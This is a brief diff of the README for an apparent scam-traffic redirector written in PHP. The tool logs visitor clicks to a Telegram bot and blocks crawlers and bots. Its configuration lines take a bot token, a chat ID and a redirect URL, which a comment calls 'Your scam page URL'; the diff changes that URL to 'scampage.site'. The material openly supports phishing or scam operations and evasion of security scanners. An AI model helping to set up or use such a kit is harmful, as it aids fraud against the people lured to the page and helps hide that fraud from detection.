@@ -34,4 +34,4 @@ It logs real visitor clicks to a **Telegram bot** and blocks unwanted bots, craw
    ```php
    $bot_token = 'BOT_TOKEN'; // Your Telegram Bot Token
    $chat_id = 'CHAT_ID';     // Your Telegram Chat ID
-   $redirect_url = 'https://your.site/web/index.html'; // Your scam page URL
+   $redirect_url = 'https://scampage.site/web/index.html'; // Your scam page URL
